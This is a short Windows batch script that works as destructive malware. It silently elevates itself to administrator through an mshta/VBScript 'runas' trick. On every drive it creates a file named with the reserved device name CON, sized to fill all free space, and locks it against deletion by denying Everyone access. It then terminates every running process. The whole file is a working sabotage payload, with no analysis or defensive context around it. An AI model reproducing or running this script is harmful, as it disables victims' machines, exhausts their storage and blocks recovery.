@echo off
%1 %2
ver|find "5.">nul&&goto :Admin
mshta vbscript:createobject("shell.application").shellexecute("%~s0","goto :Admin","","runas",0)(window.close)&goto :eof
:Admin
SETLOCAL ENABLEDELAYEDEXPANSION
FOR %%c in (Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A) do (
    IF exist %%c: (
        REM Get the freespace of the disk
        wmic LogicalDisk where "Caption='%%c:'" get FreeSpace /value > %%c:\s
        for /f %%b in ('type %%c:\s') do (
            set var=%%b
            set var=!var:~10!
        )
        del %%c:\s
        fsutil file createnew \\?\%%c:\CON !var!
        cacls \\?\%%c:\CON /t /e /c /d everyone:F 
    )
)
for /f %%I in ('wmic process get Name')do (wmic process where Name="%%I" delete)